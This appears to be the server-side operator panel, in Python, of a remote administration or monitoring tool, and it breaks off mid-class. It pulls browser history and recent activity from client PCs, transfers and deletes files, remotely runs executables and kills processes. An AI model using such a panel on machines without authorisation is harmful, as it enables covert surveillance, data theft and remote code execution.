import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import socket
import threading
import os
import queue
import subprocess
import time
import pickle
import struct
import cv2
from PIL import Image, ImageTk
import csv
import json



def recv_line(sock, max_bytes=4096):
    data = bytearray()
    while len(data) < max_bytes:
        chunk = sock.recv(1)
        if not chunk:
            break
        data.extend(chunk)
        if chunk == b"\n":
            break
    return bytes(data)


def recv_exact(sock, size):
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(min(4096, size - len(data)))
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def read_framed_json(sock, expected_prefix, timeout=1900):
    old_timeout = sock.gettimeout()
    sock.settimeout(timeout)
    try:
        header = recv_line(sock).decode('ascii', errors='ignore').strip()
        prefix = expected_prefix + '::'
        if not header.startswith(prefix):
            raise ValueError(f'Ожидался ответ {expected_prefix}, получено: {header[:120]}')
        size = int(header.split('::', 1)[1])
        payload = recv_exact(sock, size)
        return json.loads(payload.decode('utf-8', errors='ignore'))
    finally:
        sock.settimeout(old_timeout)
from datetime import datetime, date

class LogWindow(tk.Toplevel):
    def __init__(self, master, title, log_data):
        super().__init__(master)
        self.title(title)
        self.geometry("800x600")

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        log_area = scrolledtext.ScrolledText(self, wrap=tk.WORD, bg=self.entry_bg, fg=self.fg_color)
        log_area.pack(padx=10, pady=10, fill="both", expand=True)
        log_area.insert(tk.INSERT, log_data)
        log_area.configure(state='disabled')


class BrowserHistoryWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"История браузера - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("1050x650")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info
        self.history_rows = []

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        controls = tk.Frame(self, bg=self.bg_color)
        controls.pack(fill='x', padx=10, pady=8)

        tk.Label(controls, text="Дата:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=(0, 5))
        self.date_var = tk.StringVar(value=date.today().strftime("%Y-%m-%d"))
        self.date_entry = tk.Entry(
            controls,
            textvariable=self.date_var,
            width=12,
            bg=self.entry_bg,
            fg=self.fg_color,
            relief="flat",
            insertbackground=self.fg_color
        )
        self.date_entry.pack(side=tk.LEFT, ipady=4)

        today_button = tk.Button(controls, text="Сегодня", command=self.set_today, bg="#444444", fg="white", relief="flat", padx=8)
        today_button.pack(side=tk.LEFT, padx=5)

        all_dates_button = tk.Button(controls, text="Вся история", command=self.load_all_dates, bg="#444444", fg="white", relief="flat", padx=8)
        all_dates_button.pack(side=tk.LEFT, padx=5)

        tk.Label(controls, text="Браузер:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=(15, 5))
        self.browser_var = tk.StringVar(value="ALL")
        browser_box = ttk.Combobox(
            controls,
            textvariable=self.browser_var,
            values=("ALL", "CHROME", "OPERA"),
            width=10,
            state="readonly"
        )
        browser_box.pack(side=tk.LEFT, padx=5)

        load_button = tk.Button(controls, text="Показать", command=self.load_selected_date, bg=self.server_gui.red_accent, fg="white", relief="flat", padx=10)
        load_button.pack(side=tk.LEFT, padx=5)

        tk.Label(controls, text="Поиск:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=(15, 5))
        self.search_var = tk.StringVar()
        self.search_entry = tk.Entry(
            controls,
            textvariable=self.search_var,
            bg=self.entry_bg,
            fg=self.fg_color,
            relief="flat",
            insertbackground=self.fg_color
        )
        self.search_entry.pack(side=tk.LEFT, fill='x', expand=True, ipady=4)
        self.search_entry.bind("<KeyRelease>", lambda event: self.apply_filter())

        clear_button = tk.Button(controls, text="Сброс", command=self.clear_search, bg="#444444", fg="white", relief="flat", padx=8)
        clear_button.pack(side=tk.LEFT, padx=5)

        columns = ('datetime', 'browser', 'profile', 'title', 'url', 'visits')
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        self.tree.heading('datetime', text='Дата/время')
        self.tree.heading('browser', text='Браузер')
        self.tree.heading('profile', text='Профиль')
        self.tree.heading('title', text='Заголовок')
        self.tree.heading('url', text='URL')
        self.tree.heading('visits', text='Визиты')
        self.tree.column('datetime', width=145, anchor='center')
        self.tree.column('browser', width=110, anchor='center')
        self.tree.column('profile', width=120, anchor='center')
        self.tree.column('title', width=260, anchor='w')
        self.tree.column('url', width=350, anchor='w')
        self.tree.column('visits', width=70, anchor='center')
        self.tree.pack(expand=True, fill='both', padx=10, pady=(0, 10))

        bottom = tk.Frame(self, bg=self.bg_color)
        bottom.pack(fill='x', padx=10, pady=(0, 8))
        self.status_var = tk.StringVar(value="Выберите дату и нажмите «Показать».")
        tk.Label(bottom, textvariable=self.status_var, bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT)

        export_button = tk.Button(bottom, text="Экспорт CSV", command=self.export_csv, bg="#444444", fg="white", relief="flat", padx=8)
        export_button.pack(side=tk.RIGHT)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.load_selected_date()

    def set_today(self):
        self.date_var.set(date.today().strftime("%Y-%m-%d"))
        self.load_selected_date()

    def load_selected_date(self):
        target_date = self.date_var.get().strip()
        try:
            datetime.strptime(target_date, "%Y-%m-%d")
        except ValueError:
            messagebox.showwarning("Дата", "Введите дату в формате YYYY-MM-DD, например 2026-05-15.")
            return
        self.fetch_history(target_date)

    def load_all_dates(self):
        self.fetch_history(None)

    def fetch_history(self, target_date):
        self.status_var.set("Загрузка истории...")
        threading.Thread(target=self._fetch_history_thread, args=(target_date,), daemon=True).start()

    def _fetch_history_thread(self, target_date):
        ip = self.client_info['ip']
        client_entry = self.server_gui.clients.get(ip)
        if not client_entry:
            self.after(0, lambda: self.status_var.set("Клиент отключён."))
            return

        lock = client_entry['lock']
        browser_filter = self.browser_var.get().strip() or "ALL"
        date_arg = target_date if target_date else "ALL_DATES"

        with lock:
            try:
                self.client_socket.sendall(f"GET_BROWSER_HISTORY {date_arg} {browser_filter}".encode('utf-8'))
                self.client_socket.settimeout(30.0)
                header = recv_line(self.client_socket).decode('ascii', errors='ignore').strip()
                if not header.startswith("BROWSER_HISTORY::"):
                    raise RuntimeError("Получен некорректный ответ от клиента")
                payload_size = int(header.split("::", 1)[1])
                payload = recv_exact(self.client_socket, payload_size)
                self.client_socket.settimeout(None)
                data = json.loads(payload.decode('utf-8', errors='ignore'))
            except Exception as exc:
                self.client_socket.settimeout(None)
                self.after(0, lambda e=exc: messagebox.showerror("Ошибка", f"Не удалось получить историю: {e}"))
                self.after(0, lambda: self.status_var.set("Ошибка получения истории."))
                return

        self.after(0, lambda: self.update_history(data, target_date))

    def update_history(self, data, target_date):
        self.history_rows = []
        for item in data.get("entries", []):
            self.history_rows.append((
                item.get("datetime", ""),
                item.get("browser", ""),
                item.get("profile", ""),
                item.get("title", ""),
                item.get("url", ""),
                str(item.get("visit_count", "")),
            ))
        self.apply_filter()

        errors = data.get("errors", [])
        scope = target_date if target_date else "все даты"
        status = f"Загружено записей: {len(self.history_rows)} ({scope})."
        if errors:
            status += f" Ошибок чтения: {len(errors)}."
        self.status_var.set(status)
        if errors:
            messagebox.showwarning("Частично загружено", "Некоторые профили не удалось прочитать:\n" + "\n".join(errors[:8]))

    def apply_filter(self):
        query = self.search_var.get().strip().lower()
        self.tree.delete(*self.tree.get_children())
        shown = 0
        for row in self.history_rows:
            text = " ".join(row).lower()
            if not query or query in text:
                self.tree.insert("", "end", values=row)
                shown += 1
        self.status_var.set(f"Показано записей: {shown} из {len(self.history_rows)}")

    def clear_search(self):
        self.search_var.set("")
        self.apply_filter()

    def export_csv(self):
        if not self.history_rows:
            messagebox.showinfo("Экспорт", "Нет данных для экспорта.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")],
            title="Сохранить историю"
        )
        if not path:
            return
        try:
            with open(path, "w", newline="", encoding="utf-8-sig") as f:
                writer = csv.writer(f)
                writer.writerow(["Дата/время", "Браузер", "Профиль", "Заголовок", "URL", "Визиты"])
                writer.writerows(self.history_rows)
            messagebox.showinfo("Экспорт", "История сохранена.")
        except Exception as exc:
            messagebox.showerror("Ошибка", f"Не удалось сохранить CSV: {exc}")

    def on_closing(self):
        self.destroy()


class RecentActivityWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"Последние действия - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("1100x650")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info
        self.rows = []

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        controls = tk.Frame(self, bg=self.bg_color)
        controls.pack(fill='x', padx=10, pady=8)

        tk.Label(controls, text="Раздел:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=(0, 5))
        self.section_var = tk.StringVar(value="Все")
        section_box = ttk.Combobox(
            controls,
            textvariable=self.section_var,
            values=("Все", "Запуски приложений", "Установки MSI", "Файлы"),
            width=20,
            state="readonly"
        )
        section_box.pack(side=tk.LEFT, padx=5)
        section_box.bind("<<ComboboxSelected>>", lambda event: self.apply_filter())

        tk.Button(controls, text="Обновить", command=self.load_activity, bg=self.server_gui.red_accent, fg="white", relief="flat", padx=10).pack(side=tk.LEFT, padx=5)

        tk.Label(controls, text="Поиск:", bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT, padx=(15, 5))
        self.search_var = tk.StringVar()
        self.search_entry = tk.Entry(controls, textvariable=self.search_var, bg=self.entry_bg, fg=self.fg_color, relief="flat", insertbackground=self.fg_color)
        self.search_entry.pack(side=tk.LEFT, fill='x', expand=True, ipady=4)
        self.search_entry.bind("<KeyRelease>", lambda event: self.apply_filter())

        tk.Button(controls, text="Сброс", command=self.clear_search, bg="#444444", fg="white", relief="flat", padx=8).pack(side=tk.LEFT, padx=5)

        columns = ('datetime', 'section', 'title', 'details')
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        self.tree.heading('datetime', text='Дата/время')
        self.tree.heading('section', text='Раздел')
        self.tree.heading('title', text='Событие')
        self.tree.heading('details', text='Подробности')
        self.tree.column('datetime', width=150, anchor='center')
        self.tree.column('section', width=150, anchor='center')
        self.tree.column('title', width=190, anchor='w')
        self.tree.column('details', width=620, anchor='w')
        self.tree.pack(expand=True, fill='both', padx=10, pady=(0, 10))

        bottom = tk.Frame(self, bg=self.bg_color)
        bottom.pack(fill='x', padx=10, pady=(0, 8))
        self.status_var = tk.StringVar(value="Нажмите «Обновить» для загрузки последних действий.")
        tk.Label(bottom, textvariable=self.status_var, bg=self.bg_color, fg=self.fg_color).pack(side=tk.LEFT)
        tk.Button(bottom, text="Экспорт CSV", command=self.export_csv, bg="#444444", fg="white", relief="flat", padx=8).pack(side=tk.RIGHT)

        self.load_activity()

    def load_activity(self):
        self.status_var.set("Загрузка последних действий...")
        threading.Thread(target=self._load_activity_thread, daemon=True).start()

    def _load_activity_thread(self):
        ip = self.client_info['ip']
        client_entry = self.server_gui.clients.get(ip)
        if not client_entry:
            self.after(0, lambda: self.status_var.set("Клиент отключён."))
            return

        lock = client_entry['lock']
        with lock:
            try:
                self.client_socket.sendall(b"GET_RECENT_ACTIVITY")
                data = read_framed_json(self.client_socket, 'RECENT_ACTIVITY', timeout=90)
            except Exception as exc:
                self.after(0, lambda e=exc: messagebox.showerror("Ошибка", f"Не удалось получить активность: {e}"))
                self.after(0, lambda: self.status_var.set("Ошибка получения активности."))
                return

        self.after(0, lambda: self.update_activity(data))

    def update_activity(self, data):
        self.rows = []

        for item in data.get('activity', []):
            if item.get('type') == 'process_start':
                self.rows.append((
                    item.get('datetime', ''),
                    'Запуски приложений',
                    item.get('title', 'Запущено приложение'),
                    item.get('details', '')
                ))

        for item in data.get('msi_events', []):
            self.rows.append((
                item.get('datetime', ''),
                'Установки MSI',
                f"MSI Event {item.get('event_id', '')}",
                item.get('details', '')
            ))

        for item in data.get('recent_files', []):
            size = item.get('size', '')
            details = f"{item.get('folder', '')}: {item.get('path', '')}"
            if size != '':
                details += f" ({size} байт)"
            self.rows.append((
                item.get('datetime', ''),
                'Файлы',
                item.get('name', item.get('title', 'Файл')),
                details
            ))

        self.rows.sort(key=lambda row: row[0], reverse=True)
        self.apply_filter()
        extra = ''
        if data.get('activity_log_path'):
            extra = f" Лог агента: {data.get('activity_log_path')}"
        self.status_var.set(f"Загружено событий: {len(self.rows)}.{extra}")
        if data.get('error'):
            messagebox.showwarning("Частично загружено", str(data.get('error')))

    def apply_filter(self):
        query = self.search_var.get().strip().lower()
        section = self.section_var.get()
        self.tree.delete(*self.tree.get_children())
        shown = 0
        for row in self.rows:
            if section != "Все" and row[1] != section:
                continue
            if query and query not in " ".join(map(str, row)).lower():
                continue
            self.tree.insert("", "end", values=row)
            shown += 1
        self.status_var.set(f"Показано событий: {shown} из {len(self.rows)}")

    def clear_search(self):
        self.search_var.set("")
        self.section_var.set("Все")
        self.apply_filter()

    def export_csv(self):
        if not self.rows:
            messagebox.showinfo("Экспорт", "Нет данных для экспорта.")
            return
        path = filedialog.asksaveasfilename(
            title="Сохранить последние действия",
            defaultextension=".csv",
            initialfile=f"recent_activity_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            filetypes=[("CSV files", "*.csv"), ("All files", "*.*")]
        )
        if not path:
            return
        try:
            with open(path, "w", newline="", encoding="utf-8-sig") as f:
                writer = csv.writer(f, delimiter=';')
                writer.writerow(["Дата/время", "Раздел", "Событие", "Подробности"])
                writer.writerows(self.rows)
            messagebox.showinfo("Экспорт", "Файл сохранён.")
        except Exception as exc:
            messagebox.showerror("Ошибка", f"Не удалось сохранить CSV: {exc}")

class FileManagerWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"Файловый менеджер - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("800x600")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        top_frame = tk.Frame(self, bg=self.bg_color)
        top_frame.pack(fill='x', padx=10, pady=5)

        self.path_entry = tk.Entry(top_frame, bg=self.entry_bg, fg=self.fg_color, relief="flat", insertbackground=self.fg_color)
        self.path_entry.pack(side=tk.LEFT, expand=True, fill='x', ipady=5)
        self.path_entry.bind("<Return>", self.navigate_path)

        go_button = tk.Button(top_frame, text="Перейти", command=self.navigate_path, bg=self.server_gui.red_accent, fg="white", relief="flat", borderwidth=0, padx=10)
        go_button.pack(side=tk.RIGHT, padx=5)

        back_button = tk.Button(top_frame, text="Назад", command=self.go_back, bg="#555555", fg="white", relief="flat", borderwidth=0, padx=10)
        back_button.pack(side=tk.RIGHT, padx=5)

        self.folder_icon = "📁"
        self.file_icon = "📄"
        self.drive_icon = "💾"

        self.tree = ttk.Treeview(self, columns=('type', 'name'), show='headings')
        self.tree.heading('type', text='')
        self.tree.heading('name', text='Имя')
        self.tree.column('type', width=50, anchor='center', stretch=tk.NO)
        self.tree.pack(expand=True, fill='both', padx=10, pady=10)
        self.tree.bind("<Double-1>", self.on_item_double_click)
        self.tree.bind("<Button-3>", self.show_context_menu)

        button_frame = tk.Frame(self, bg=self.bg_color)
        button_frame.pack(fill='x', padx=10, pady=5)

        upload_button = tk.Button(button_frame, text="Загрузить файл", command=self.upload_file, bg=self.server_gui.red_accent, fg="white", relief="flat", borderwidth=0, padx=10)
        upload_button.pack(side=tk.LEFT, padx=5)

        download_button = tk.Button(button_frame, text="Скачать файл", command=self.download_file, bg=self.server_gui.red_accent, fg="white", relief="flat", borderwidth=0, padx=10)
        download_button.pack(side=tk.LEFT, padx=5)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.current_path = ""
        self.request_drives()

        self.context_menu = tk.Menu(self, tearoff=0, bg=self.entry_bg, fg=self.fg_color)
        self.context_menu.add_command(label="Скачать", command=self.download_file)
        self.context_menu.add_command(label="Запустить", command=self.execute_file)
        self.context_menu.add_command(label="Удалить", command=self.delete_file)

    def show_context_menu(self, event):
        item_id = self.tree.identify_row(event.y)
        if item_id:
            self.tree.selection_set(item_id)
            item = self.tree.item(item_id, 'values')
            if item:
                if item[1].lower().endswith('.exe'):
                    self.context_menu.entryconfigure("Запустить", state="normal")
                else:
                    self.context_menu.entryconfigure("Запустить", state="disabled")

                if item[0] == self.file_icon and item[1] != "..":
                    self.context_menu.entryconfigure("Удалить", state="normal")
                else:
                    self.context_menu.entryconfigure("Удалить", state="disabled")
            self.context_menu.post(event.x_root, event.y_root)

    def go_back(self):
        if self.current_path and len(self.current_path) > 3:
            parent_path = os.path.dirname(self.current_path.rstrip('\\/'))
            if len(parent_path) < 3:
                self.request_drives()
            else:
                self.list_directory(parent_path)
        else:
            self.request_drives()

    def execute_file(self):
        selected_item = self.tree.selection()
        if not selected_item:
            return
        
        item = self.tree.item(selected_item[0], 'values')
        if not item[1].lower().endswith('.exe'):
            return

        remote_path = os.path.join(self.current_path, item[1]).replace('\\', '/')
        try:
            self.client_socket.send(f"EXECUTE {remote_path}".encode('utf-8'))
            messagebox.showinfo("Команда отправлена", f"Команда на запуск {item[1]} отправлена.")
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось отправить команду: {e}")

    def upload_file(self):
        local_path = filedialog.askopenfilename(title="Выберите файл для загрузки")
        if not local_path:
            return

        remote_filename = os.path.basename(local_path)
        remote_path = os.path.join(self.current_path, remote_filename).replace('\\', '/')
        
        threading.Thread(target=self.handle_upload, args=(local_path, remote_path), daemon=True).start()

    def handle_upload(self, local_path, remote_path):
        try:
            with self.server_gui.clients[self.client_info['ip']]['lock']:
                self.client_socket.send(f"UPLOAD {remote_path}".encode('utf-8'))
                time.sleep(0.1)
                with open(local_path, 'rb') as f:
                    while True:
                        bytes_read = f.read(4096)
                        if not bytes_read:
                            break
                        self.client_socket.sendall(bytes_read)
                time.sleep(0.1)
                self.client_socket.send(b"DONE_UPLOADING")
            self.after(0, lambda: messagebox.showinfo("Успех", f"Файл {os.path.basename(local_path)} успешно загружен."))
            self.after(0, lambda: self.list_directory(self.current_path))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка загрузки: {e}"))

    def download_file(self):
        selected_item = self.tree.selection()
        if not selected_item:
            messagebox.showwarning("Внимание", "Выберите файл для скачивания.")
            return
        
        item = self.tree.item(selected_item[0], 'values')
        if item[0] != self.file_icon:
            messagebox.showwarning("Внимание", "Можно скачивать только файлы.")
            return

        remote_path = os.path.join(self.current_path, item[1]).replace('\\', '/')
        local_path = filedialog.asksaveasfilename(title="Сохранить файл как...", initialfile=item[1])
        if not local_path:
            return

        threading.Thread(target=self.handle_download, args=(remote_path, local_path), daemon=True).start()

    def delete_file(self):
        selected_item = self.tree.selection()
        if not selected_item:
            messagebox.showwarning("Внимание", "Выберите файл для удаления.")
            return
        
        item = self.tree.item(selected_item[0], 'values')
        if item[0] != self.file_icon or item[1] == "..":
            messagebox.showwarning("Внимание", "Можно удалять только обычные файлы.")
            return

        if not messagebox.askyesno("Подтверждение", f"Удалить файл '{item[1]}'?"):
            return

        remote_path = os.path.join(self.current_path, item[1]).replace('\\', '/')
        try:
            with self.server_gui.clients[self.client_info['ip']]['lock']:
                self.client_socket.send(f"DELETE {remote_path}".encode('utf-8'))
            messagebox.showinfo("Готово", f"Команда на удаление файла '{item[1]}' отправлена.")
            # Обновляем список файлов в текущей директории
            self.list_directory(self.current_path)
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось отправить команду удаления: {e}")

    def handle_download(self, remote_path, local_path):
        try:
            with self.server_gui.clients[self.client_info['ip']]['lock']:
                self.client_socket.send(f"DOWNLOAD {remote_path}".encode('utf-8'))
                
                with open(local_path, 'wb') as f:
                    while True:
                        self.client_socket.settimeout(10.0)
                        chunk = self.client_socket.recv(4096)
                        if chunk.endswith(b"DONE_DOWNLOADING"):
                            f.write(chunk[:-16])
                            break
                        elif chunk == b"FILE_NOT_FOUND":
                             self.after(0, lambda: messagebox.showerror("Ошибка", "Файл не найден на удаленной машине."))
                             os.remove(local_path)
                             return
                        f.write(chunk)
            self.after(0, lambda: messagebox.showinfo("Успех", f"Файл {os.path.basename(local_path)} успешно скачан."))
        except socket.timeout:
            self.after(0, lambda: messagebox.showerror("Ошибка", "Таймаут при скачивании файла."))
        except Exception as e:
            self.after(0, lambda: messagebox.showerror("Ошибка", f"Ошибка скачивания: {e}"))
        finally:
            self.client_socket.settimeout(None)

    def on_closing(self):
        self.server_gui.file_manager_windows.pop(self.client_info['ip'], None)
        self.destroy()

    def request_drives(self):
        try:
            self.client_socket.send("LIST_DRIVES".encode('utf-8'))
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запросить диски: {e}")
            self.destroy()

    def navigate_path(self, event=None):
        path = self.path_entry.get()
        self.list_directory(path)

    def list_directory(self, path):
        try:
            if not path:
                self.request_drives()
                return
            self.client_socket.send(f"LIST_DIR {path}".encode('utf-8'))
            self.current_path = path
            self.path_entry.delete(0, tk.END)
            self.path_entry.insert(0, self.current_path)
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запросить содержимое директории: {e}")

    def on_item_double_click(self, event):
        item_id = self.tree.identify_row(event.y)
        if not item_id:
            return
        
        item = self.tree.item(item_id, 'values')
        item_type, item_name = item[0], item[1]

        if item_name == "..":
            new_path = os.path.dirname(self.current_path.rstrip('\\/'))
            if not new_path or len(new_path) <= 3:
                self.request_drives()
            else:
                self.list_directory(new_path)
        elif item_type == self.folder_icon or item_type == self.drive_icon:
            new_path = os.path.join(self.current_path, item_name)
            self.list_directory(new_path)

    def update_file_list(self, data):
        self.tree.delete(*self.tree.get_children())
        if self.current_path and len(self.current_path) > 3:
             self.tree.insert("", "end", values=(self.folder_icon, ".."))

        if not data:
            return
        
        items = data.split('||')
        dirs = sorted([item.split("::")[1] for item in items if item.startswith("DIR::")])
        files = sorted([item.split("::")[1] for item in items if item.startswith("FILE::")])

        for dir_name in dirs:
            self.tree.insert("", "end", values=(self.folder_icon, dir_name))
        for file_name in files:
            self.tree.insert("", "end", values=(self.file_icon, file_name))

    def update_drive_list(self, drives):
        self.tree.delete(*self.tree.get_children())
        self.current_path = ""
        self.path_entry.delete(0, tk.END)
        for drive in drives:
            self.tree.insert("", "end", values=(self.drive_icon, drive))


class ProcessManagerWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"Процессы - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("700x500")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        top_frame = tk.Frame(self, bg=self.bg_color)
        top_frame.pack(fill='x', padx=10, pady=5)

        refresh_button = tk.Button(
            top_frame,
            text="Обновить",
            command=self.refresh_processes,
            bg=self.server_gui.red_accent,
            fg="white",
            relief="flat",
            borderwidth=0,
            padx=10
        )
        refresh_button.pack(side=tk.LEFT, padx=5)

        search_label = tk.Label(
            top_frame,
            text="Поиск:",
            bg=self.bg_color,
            fg=self.fg_color
        )
        search_label.pack(side=tk.LEFT, padx=(15, 5))

        self.search_var = tk.StringVar()
        self.search_entry = tk.Entry(
            top_frame,
            textvariable=self.search_var,
            bg=self.entry_bg,
            fg=self.fg_color,
            relief="flat",
            insertbackground=self.fg_color
        )
        self.search_entry.pack(side=tk.LEFT, fill='x', expand=True, ipady=4)
        self.search_entry.bind("<KeyRelease>", self.on_search_change)

        clear_search_button = tk.Button(
            top_frame,
            text="Сброс",
            command=self.clear_search,
            bg="#444444",
            fg="white",
            relief="flat",
            borderwidth=0,
            padx=8
        )
        clear_search_button.pack(side=tk.LEFT, padx=5)

        self.process_rows = []

        self.tree = ttk.Treeview(
            self,
            columns=('pid', 'name', 'session', 'mem'),
            show='headings'
        )
        self.tree.heading('pid', text='PID')
        self.tree.heading('name', text='Имя процесса')
        self.tree.heading('session', text='Сессия')
        self.tree.heading('mem', text='Память')
        self.tree.column('pid', width=80, anchor='center')
        self.tree.column('name', width=260, anchor='w')
        self.tree.column('session', width=120, anchor='center')
        self.tree.column('mem', width=120, anchor='e')
        self.tree.pack(expand=True, fill='both', padx=10, pady=10)

        self.tree.bind("<Button-3>", self.show_context_menu)

        self.context_menu = tk.Menu(self, tearoff=0, bg=self.entry_bg, fg=self.fg_color)
        self.context_menu.add_command(label="Завершить процесс", command=self.kill_selected_process)

        self.auto_refresh_interval = 5000  # мс
        self.refresh_in_progress = False
        self.auto_refresh_active = True

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.refresh_processes()
        self.schedule_auto_refresh()

    def show_context_menu(self, event):
        item_id = self.tree.identify_row(event.y)
        if item_id:
            self.tree.selection_set(item_id)
            self.context_menu.post(event.x_root, event.y_root)

    def refresh_processes(self):
        if self.refresh_in_progress:
            return
        self.refresh_in_progress = True
        threading.Thread(target=self.fetch_processes, daemon=True).start()

    def schedule_auto_refresh(self):
        if not self.auto_refresh_active:
            return
        self.after(self.auto_refresh_interval, self._auto_refresh)

    def _auto_refresh(self):
        if not self.auto_refresh_active:
            return
        self.refresh_processes()
        self.schedule_auto_refresh()

    def fetch_processes(self):
        ip = self.client_info['ip']
        client_entry = self.server_gui.clients.get(ip)
        if not client_entry:
            self.after(0, lambda: setattr(self, "refresh_in_progress", False))
            return

        lock = client_entry['lock']
        full_data = b""

        with lock:
            try:
                self.client_socket.sendall("LIST_PROCESSES".encode('utf-8'))
                self.client_socket.settimeout(15.0)

                header = recv_line(self.client_socket).decode('ascii', errors='ignore').strip()
                if not header.startswith("PROCESS_LIST::"):
                    full_data = header.encode('utf-8', errors='ignore')
                else:
                    payload_size = int(header.split("::", 1)[1])
                    full_data = recv_exact(self.client_socket, payload_size)

                self.client_socket.settimeout(None)
            except Exception as e:
                self.client_socket.settimeout(None)
                self.after(0, lambda: messagebox.showerror("Ошибка", f"Не удалось получить список процессов: {e}"))

        try:
            text = full_data.decode('utf-8', errors='ignore')
        except Exception:
            text = ""

        self.after(0, lambda: self.update_process_list(text))
        self.after(0, lambda: setattr(self, "refresh_in_progress", False))

    def update_process_list(self, raw_data):
        self.process_rows = []
        if not raw_data:
            self.apply_process_filter()
            return

        reader = csv.reader(raw_data.splitlines())
        for row in reader:
            if not row or len(row) < 5:
                continue
            image_name, pid, session_name, session_num, mem_usage = row
            if image_name.strip().strip('"').lower() == "image name":
                continue

            self.process_rows.append((
                pid.strip().strip('"'),
                image_name.strip().strip('"'),
                session_name.strip().strip('"'),
                mem_usage.strip().strip('"')
            ))

        self.apply_process_filter()

    def on_search_change(self, event=None):
        self.apply_process_filter()

    def clear_search(self):
        self.search_var.set("")
        self.apply_process_filter()

    def apply_process_filter(self):
        query = self.search_var.get().strip().lower() if hasattr(self, "search_var") else ""

        self.tree.delete(*self.tree.get_children())

        for values in self.process_rows:
            pid, name, session, mem = values
            searchable_text = f"{pid} {name} {session} {mem}".lower()

            if not query or query in searchable_text:
                self.tree.insert("", "end", values=values)

    def kill_selected_process(self):
        selected_item = self.tree.selection()
        if not selected_item:
            messagebox.showwarning("Внимание", "Выберите процесс для завершения.")
            return

        pid, name, _, _ = self.tree.item(selected_item[0], 'values')
        if not messagebox.askyesno("Подтверждение", f"Завершить процесс {name} (PID {pid})?"):
            return

        try:
            self.client_socket.send(f"KILL_PROCESS {pid}".encode('utf-8'))
            messagebox.showinfo("Команда отправлена", f"Команда на завершение процесса {name} (PID {pid}) отправлена.")
            self.after(1000, self.refresh_processes)
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось отправить команду завершения процесса: {e}")

    def on_closing(self):
        self.auto_refresh_active = False
        self.server_gui.process_windows.pop(self.client_info['ip'], None)
        self.destroy()


class ChatWindow(tk.Toplevel):
    def __init__(self, master, server_gui, client_socket, client_info):
        super().__init__(master)
        self.title(f"Чат - {client_info['pc_name']} ({client_info['ip']})")
        self.geometry("500x400")
        self.server_gui = server_gui
        self.client_socket = client_socket
        self.client_info = client_info

        self.bg_color = "#1c1c1c"
        self.fg_color = "#e0e0e0"
        self.red_accent = "#ff3333"
        self.entry_bg = "#333333"
        self.configure(bg=self.bg_color)

        self.log_area = scrolledtext.ScrolledText(
            self,
            wrap=tk.WORD,
            bg=self.entry_bg,
            fg=self.fg_color,
            insertbackground=self.fg_color,
            relief="flat"
        )
        self.log_area.pack(padx=10, pady=10, fill="both", expand=True)
        self.log_area.configure(state='disabled')

        bottom_frame = tk.Frame(self, bg=self.bg_color)
        bottom_frame.pack(fill='x', padx=10, pady=5)

        self.message_entry = tk.Entry(
            bottom_frame,
            bg=self.entry_bg,
            fg=self.fg_color,
            relief="flat",
            insertbackground=self.fg_color
        )
        self.message_entry.pack(side=tk.LEFT, expand=True, fill='x', ipady=5)
        self.message_entry.bind("<Return>", self.send_message)

        send_button = tk.Button(
            bottom_frame,
            text="Отправить",
            command=self.send_message,
            bg=self.red_accent,
            fg="white",
            relief="flat",
            activebackground="#b30000",
            activeforeground="white",
            borderwidth=0,
            padx=10
        )
        send_button.pack(side=tk.RIGHT, padx=5)

        self.protocol("WM_DELETE_WINDOW", self.on_closing)

    def log(self, author, text):
        self.log_area.configure(state='normal')
        self.log_area.insert(tk.END, f"{author}: {text}\n")
